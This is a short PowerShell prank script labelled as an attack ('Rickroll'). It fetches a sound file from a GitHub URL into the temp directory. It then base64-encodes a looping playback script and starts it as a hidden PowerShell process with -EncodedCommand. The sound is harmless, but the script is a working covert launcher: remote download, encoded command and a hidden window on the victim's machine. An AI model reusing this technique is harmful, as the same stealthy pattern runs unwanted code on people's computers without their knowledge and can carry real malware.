# ATTACK: Rickroll
$url = "https://raw.githubusercontent.com/mhoivik/HarmlessMalware/master/rickroll.wav"
$output = "$env:TEMP\roll.wav"

$code = @"
    `$url = "$url"
    `$output = "$output"
    try {
        Invoke-WebRequest -Uri `$url -OutFile `$output -ErrorAction Stop
    } catch {
        exit
    }
    `$player = New-Object System.Media.SoundPlayer `$output
    while (`$true) {
        `$player.PlaySync()
    }
"@

$bytes = [Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)

Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
